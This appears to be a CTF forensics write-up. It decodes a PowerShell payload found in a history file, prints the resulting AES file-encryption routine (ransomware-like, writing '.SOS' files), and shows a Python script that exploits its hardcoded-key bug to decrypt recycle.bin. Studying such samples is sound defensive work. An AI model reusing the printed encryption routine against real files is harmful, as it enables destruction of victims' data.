`cat home/kalilinux/.local/share/powershell/PSReadLine/ConsoleHost_history.txt`
decode the base64 with chef using this recipe: https://gchq.github.io/CyberChef/#recipe=From_Base64(%27A-Za-z0-9%2B/%3D%27,true,false)Raw_Inflate(0,0,%27Adaptive%27,false,false)&input=
fix the script by replacing iEX with echo and run the script to get a clean look.

you get this
```js
function Encryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC

        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes('$encryptedBytes'))
        if ($Path) {
            $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
            if (!$File.FullName) {

                Write-Error -Message "File not found!"
                break
            }
            $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
            $outPath = $File.FullName + ".SOS"
        }
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
        $encryptedBytes = $aesManaged.IV + $encryptedBytes
        $aesManaged.Dispose()
        if ($Path) {
            [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
            (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
            return "File encrypted to $outPath"
        }
    }
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```
Notice `$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes('$encryptedBytes'))` where $encryptedBytes is used as a string not as a variable.
create a python script to decode the recycle.bin file in `/home/kalilinux/Desktop/` (if you checked .zsh_history you notice this `mv T3C4U.SOS recycle.bin` in there) 
```py
from Crypto.Cipher import AES
from hashlib import sha256

data = open('./home/kalilinux/Desktop/recycle.bin', 'rb').read()
key = sha256(b'$encryptedBytes').digest()

iv, ct = data[:16], data[16:]
aes = AES.new(key, AES.MODE_CBC, iv)
open('decrypted.bin', 'wb').write(aes.decrypt(ct))
```
copy the whole .gnupg  folder to ~/ in a vm and run `gpg --decrypt decrypted.bin > dec.pdf`